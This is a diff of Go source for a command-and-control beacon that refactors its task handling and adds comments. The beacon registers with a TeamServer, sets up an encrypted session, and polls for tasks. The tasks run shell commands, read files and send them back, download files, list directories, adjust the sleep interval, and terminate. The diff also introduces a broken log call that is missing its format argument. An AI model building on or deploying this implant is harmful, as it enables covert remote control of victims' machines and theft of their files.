@@ -86,6 +86,8 @@ type FileInfo struct {
 
 // --- Main Logic ---
 
+// main is the entry point of the beacon.
+// It performs the initial handshake and staging, then enters the check-in loop.
 func main() {
 	if serverURL == "" {
 		log.Fatal("serverURL is not set. Please set it at build time using -ldflags.")
@@ -104,11 +106,13 @@ func main() {
 	checkInLoop()
 }
 
+// checkInLoop is the main loop of the beacon.
+// It periodically checks in with the TeamServer to get tasks and sends back the results.
 func checkInLoop() {
 	log.Println("Entering check-in loop...")
 	for {
 		time.Sleep(sleepInterval)
-		log.Printf("Checking in for tasks (interval: %s)...", sleepInterval)
+		log.Printf("Checking in for tasks (interval: %s)...")
 
 		checkinReqMap := map[string]string{"beacon_id": beaconID}
 		checkinReqBody, _ := json.Marshal(checkinReqMap)
@@ -140,76 +144,94 @@ func checkInLoop() {
 	}
 }
 
+// processTasks iterates over the received tasks and executes them.
 func processTasks(tasks []*Task) {
 	for _, task := range tasks {
 		var output []byte
-		var execErr error
+		var err error
 
 		switch task.CommandID {
 		case 1: // Shell
-			output, execErr = executeShellCommand(string(task.Arguments))
+			output, err = handleShellTask(task)
 		case 2: // Download
-			execErr = handleDownloadTask(task)
-			if execErr == nil {
+			err = handleDownloadTask(task)
+			if err == nil {
 				output = []byte("File downloaded successfully.")
 			}
 		case 3: // Upload
-			output, execErr = handleUploadTask(task)
+			output, err = handleUploadTask(task)
 		case 4: // Exit
-			log.Println("Received exit command. Terminating.")
-			os.Exit(0)
+			handleExitTask()
 		case 5: // Sleep
-			var newSleep int32
-			// 调试：打印原始参数
-			log.Printf("Sleep task received. TaskID: %s, Arguments length: %d, Arguments raw: %q", task.TaskID, len(task.Arguments), string(task.Arguments))
-
-			if len(task.Arguments) == 0 {
-				execErr = fmt.Errorf("empty sleep arguments")
-			} else {
-				// 尝试解析为JSON数字或字符串
-				var sleepValue interface{}
-				if err := json.Unmarshal(task.Arguments, &sleepValue); err != nil {
-					execErr = fmt.Errorf("invalid JSON: %v", err)
-				} else {
-					// 处理数字或字符串格式
-					switch v := sleepValue.(type) {
-					case float64: // JSON数字: 30
-						newSleep = int32(v)
-					case string: // JSON字符串: "30"
-						if parsed, err := parseInt32(v); err != nil {
-							execErr = fmt.Errorf("invalid sleep value: %s", v)
-						} else {
-							newSleep = parsed
-						}
-					default:
-						execErr = fmt.Errorf("unsupported sleep argument type: %T", v)
-					}
-
-					// 验证范围
-					if execErr == nil {
-						if newSleep < 1 || newSleep > 3600 {
-							execErr = fmt.Errorf("sleep value must be between 1 and 3600 seconds, got %d", newSleep)
-						} else {
-							sleepInterval = time.Duration(newSleep) * time.Second
-							log.Printf("Updated check-in interval to %s", sleepInterval)
-							output = []byte(fmt.Sprintf("Sleep interval set to %d seconds", newSleep))
-						}
-					}
-				}
-			}
+			output, err = handleSleepTask(task)
 		case 6: // Browse
-			output, execErr = handleBrowseTask(task)
+			output, err = handleBrowseTask(task)
 		default:
-			execErr = fmt.Errorf("unknown command ID: %d", task.CommandID)
+			err = fmt.Errorf("unknown command ID: %d", task.CommandID)
 		}
 
-		if execErr != nil {
-			log.Printf("Error executing task %s: %v", task.TaskID, execErr)
-			output = []byte(fmt.Sprintf("Task failed: %v", execErr))
+		if err != nil {
+			log.Printf("Error executing task %s: %v", task.TaskID, err)
+			output = []byte(fmt.Sprintf("Task failed: %v", err))
 		}
 
 		pushTaskOutput(task.TaskID, output)
 	}
+}
+
+// --- Task Handlers ---
+
+func handleShellTask(task *Task) ([]byte, error) {
+	return executeShellCommand(string(task.Arguments))
+}
+
+func handleUploadTask(task *Task) ([]byte, error) {
+	sourcePath := string(task.Arguments)
+	log.Printf("Reading file from %s to upload", sourcePath)
+	return os.ReadFile(sourcePath)
+}
+
+func handleExitTask() {
+	log.Println("Received exit command. Terminating.")
+	os.Exit(0)
+}
+
+func handleSleepTask(task *Task) ([]byte, error) {
+	var newSleep int32
+	// 调试：打印原始参数
+	log.Printf("Sleep task received. TaskID: %s, Arguments length: %d, Arguments raw: %q", task.TaskID, len(task.Arguments), string(task.Arguments))
+
+	if len(task.Arguments) == 0 {
+		return nil, fmt.Errorf("empty sleep arguments")
+	}
+	// 尝试解析为JSON数字或字符串
+	var sleepValue interface{}
+	if err := json.Unmarshal(task.Arguments, &sleepValue); err != nil {
+		return nil, fmt.Errorf("invalid JSON: %v", err)
+	}
+
+	// 处理数字或字符串格式
+	switch v := sleepValue.(type) {
+	case float64: // JSON数字: 30
+		newSleep = int32(v)
+	case string: // JSON字符串: "30"
+		parsed, err := parseInt32(v)
+		if err != nil {
+			return nil, fmt.Errorf("invalid sleep value: %s", v)
+		}
+		newSleep = parsed
+	default:
+		return nil, fmt.Errorf("unsupported sleep argument type: %T", v)
+	}
+
+	// 验证范围
+	if newSleep < 1 || newSleep > 3600 {
+		return nil, fmt.Errorf("sleep value must be between 1 and 3600 seconds, got %d", newSleep)
+	}
+
+	sleepInterval = time.Duration(newSleep) * time.Second
+	log.Printf("Updated check-in interval to %s", sleepInterval)
+	return []byte(fmt.Sprintf("Sleep interval set to %d seconds", newSleep)), nil
 }
 
 func pushTaskOutput(taskID string, output []byte) {
@@ -236,6 +258,7 @@ func pushTaskOutput(taskID string, output []byte) {
 
 // --- HTTP & Staging ---
 
+// stageBeacon sends the initial beacon metadata to the TeamServer to register itself.
 func stageBeacon() error {
 	hostname, _ := os.Hostname()
 	metadata := BeaconMetadata{
@@ -273,6 +296,8 @@ func stageBeacon() error {
 	return nil
 }
 
+// doPost performs a POST request to the TeamServer with the given URL and body.
+// It handles the encryption and decryption of the request and response.
 func doPost(url string, body []byte) ([]byte, error) {
 	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(body))
 	req.Header.Set("Content-Type", "application/octet-stream")
@@ -309,6 +334,7 @@ func doPost(url string, body []byte) ([]byte, error) {
 
 // --- Encryption & Handshake ---
 
+// performHandshake performs the initial handshake with the listener to establish a session and a session key.
 func performHandshake() error {
 	key := make([]byte, 32) // AES-256
 	if _, err := rand.Read(key); err != nil {
@@ -507,12 +533,6 @@ func handleDownloadTask(task *Task) error {
 	return nil
 }
 
-
-func handleUploadTask(task *Task) ([]byte, error) {
-	sourcePath := string(task.Arguments)
-	log.Printf("Reading file from %s to upload", sourcePath)
-	return os.ReadFile(sourcePath)
-}
 
 func handleBrowseTask(task *Task) ([]byte, error) {
 	dirPath := string(task.Arguments)
